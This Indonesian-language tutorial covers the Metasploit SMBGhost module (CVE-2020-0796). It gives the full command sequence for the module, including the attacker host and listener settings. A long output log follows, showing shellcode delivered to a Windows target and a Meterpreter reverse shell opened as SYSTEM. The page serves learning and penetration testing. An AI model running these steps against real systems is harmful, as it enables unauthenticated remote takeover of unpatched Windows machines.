# cve_2020_0796_smbghost

Modul `cve_2020_0796_smbghost` di Metasploit adalah modul `exploit remote` untuk sistem Windows yang memanfaatkan kerentanan dalam protokol `SMBv3` (`CVE-2020-0796`), dikenal sebagai `SMBGhost`. Kerentanan ini memungkinkan eksekusi kode arbitrer secara remote dan tanpa otentikasi pada sistem yang rentan, sehingga dapat digunakan untuk mendapatkan kontrol penuh atas target atau melakukan `worm-like propagation` dalam jaringan.

## Cara Penggunaan di Metasploit

```
use exploit/windows/smb/cve_2020_0796_smbghost
set PAYLOAD <PAYLOAD>
set RHOSTS <IP_TARGET>
set RPORT 445
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] 192.168.1.51:445 - Running automatic check ("set AutoCheck false" to disable)
[!] 192.168.1.51:445 - The service is running, but could not be validated.
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000013000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000002000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000003000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000004000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000005000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000006000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000007000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000008000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000009000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000a000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000b000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000c000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000d000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000e000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000000f000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000010000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000011000
[*] 192.168.1.51:445 - Found low stub at physical address 0x0000000000011000, virtual address 0xfffff7cb4000e000
[*] 192.168.1.51:445 - Found PML4 at 0x00000000001aa000 (BIOS)
[*] 192.168.1.51:445 - Found HAL heap at 0xfffff7cb40000000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa200
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa400
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa600
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aa800
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aaa00
[*] 192.168.1.51:445 - Found PML4 self-reference entry at 0x0151
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aaf78
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000003e00968
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000003e03000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000003e04000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001200
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001400
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001600
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001800
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001a00
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001c00
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000001e00
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000003e04008
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000005200
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000000005400
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000000054c0
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aaf80
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000040080c0
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000004009cc0
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x000000000215ebb0
[*] 192.168.1.51:445 - Found hal!HalpInterruptController at 0xfffff7cb40001448
[*] 192.168.1.51:445 - Found hal!HalpApicRequestInterrupt at 0xfffff8063315ebb0
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x00000000001aaa88
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000003e00000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000003e01000
[*] 192.168.1.51:445 - Reading from physical memory at index: 0x0000000003e02000
[*] 192.168.1.51:445 - KUSER_SHARED_DATA PTE NX bit cleared!
[*] 192.168.1.51:445 - Transferring 1274 bytes of shellcode...
[*] 192.168.1.51:445 - Transfer complete, hooking hal!HalpApicRequestInterrupt to trigger execution...
[*] Sending stage (203846 bytes) to 192.168.1.51
[*] Meterpreter session 1 opened (192.168.1.11:4444 -> 192.168.1.51:49747) at 2025-05-17 08:47:51 +0700
[*] 192.168.1.51:445 - Restoring the KUSER_SHARED_DATA PTE NX bit...
[*] 192.168.1.51:445 - Cleaning up the contents of KUSER_SHARED_DATA...

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
